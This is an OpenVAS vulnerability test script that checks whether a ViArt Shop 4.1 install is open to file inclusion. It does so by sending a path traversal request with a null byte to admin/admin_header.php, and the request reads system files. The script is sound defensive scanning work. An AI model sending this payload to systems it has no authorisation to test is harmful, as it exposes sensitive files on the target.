###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_viart_shop_rfi_2012_09.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# ViArt Shop File Inclusion Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ViArt Shop is prone to a file inclusion vulnerability because it
fails to adequately sanitize user-supplied input..

Affected version: 4.1";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103580";
CPE = "cpe:/a:viart:viart_shop";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 7577 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("ViArt Shop File Inclusion Vulnerability");

 script_xref(name : "URL" , value : "http://se3c.blogspot.de/2012/09/viart-shop-evaluation-v41-multiple.html");

 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2012-09-26 10:51:47 +0200 (Wed, 26 Sep 2012)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_viart_shop_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("viart_shop/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = dir + '/admin/admin_header.php?root_folder_path=' + crap(data:"../",length:9*6) + files[file] + "%00";

  if(http_vuln_check(port:port, url:url,pattern:file)) {
    security_message(port:port);
    exit(0);
  }  

}

exit(0);
